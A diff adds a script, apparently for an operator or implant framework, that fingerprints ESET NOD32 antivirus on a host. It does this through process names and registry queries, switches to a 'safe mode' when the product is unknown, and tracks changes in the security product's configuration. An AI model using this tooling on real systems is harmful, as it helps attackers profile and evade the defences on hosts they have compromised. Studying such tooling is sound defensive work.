@@ -1,0 +1,98 @@
+@include "PSPHelpers.epm";
+@include "PerlFunctions.epm";
+
+string $version;
+string $versionnumber;
+
+echo "Starting Nod32 configuration change check";
+@echo off;
+@record on;
+
+
+if(`log processlist`) {
+	int $ids = GetCmdData("id");
+	string $names = GetCmdData("name");
+	int $i=0;
+	while ($i < sizeof($ids)) {
+		if($names[$i] == "nod32krn.exe" || $names[$i] == "nod32kui.exe") {
+			echo "Current Version: ESET Nod32 Anti Virus 2.7";
+			$version = "Anti Virus 2.7";
+			break;
+		}
+
+		if($names[$i] == "ekrn.exe" || $names[$i] == "egui.exe") {
+			$version = "Anti Virus 3.0";
+			break;
+		}
+			$i++;
+	}
+}
+
+if($version == "Anti Virus 3.0"){
+
+	if(`regquery -hive L -subkey "software\\eset\\eset security\\currentversion\\info" -value productname`) {
+		string $value = getCmdData("value_data");
+		if($value == "ESET Smart Security"){
+			$version = "Smart Security 3.0"; 
+			# echo "Current Version: ESET Nod32 Smart Security";
+		}else if($value == "ESET NOD32 Antivirus") {
+			# echo "Current Version: ESET Nod32 Anti Virus ";
+		}else {
+			$version = "UNKNOWN";
+			}
+	if(`regquery -hive L -subkey "software\\eset\\eset security\\currentversion\\info" -value productversion`) {
+		string $versionnumber = getCmdData("value_data");
+		echo "Version: $value $versionnumber";
+		}
+	}
+
+}
+
+if($version == "Anti Virus 2.7" || $version == "Anti Virus 3.0" || $version == "Smart Security 3.0") {
+	 nod($version);
+}else {
+	echo "Current Version: Unknown!";
+	# We don't know what it is lets default to safe mode
+	safety();
+	if (prompt "Pulling ESET registry information?") {
+		`background regquery -hive L -subkey "software\\eset" -recursive`;
+	} else {
+		echo "Please reconsider so we can fingerprint this...";
+	}
+}
+
+sub safety() {
+	SetEnv("NOPROCINFO", "TRUE");
+}
+
+sub nod(IN string $version) {
+	@record on;
+	#The struct is defined in PSPHelpers.epm
+	metaData @metaData;
+	#initialize the struct
+	init(@metaData);
+
+	if(@metaData.$history){
+		if(checkConfig("nod32:$version",@metaData)){
+			echo "\r\rNo change in PSP configs.\r\r";
+		}else{
+			echo "\r\r!!!Changed PSP configs since last time!!!\r\r";
+		}
+	}
+	
+	echo "Writing PSP Metadata information to pspInformation.txt";
+
+	# Don't have much to put here at the moment...	
+	@metaData.$vendor = "ESET";
+	@metaData.$product = "NOD32";
+	@metaData.$version = $version;
+
+	@record off;
+	if(writeMetaData(@metaData)) {
+		echo "Wrote meta data to disk";
+	} else {
+		echo "ERROR: Could not write meta data to disk.";
+	}
+	# echo "Current Version: @metaData.$product (@metaData.$version)";
+}
+
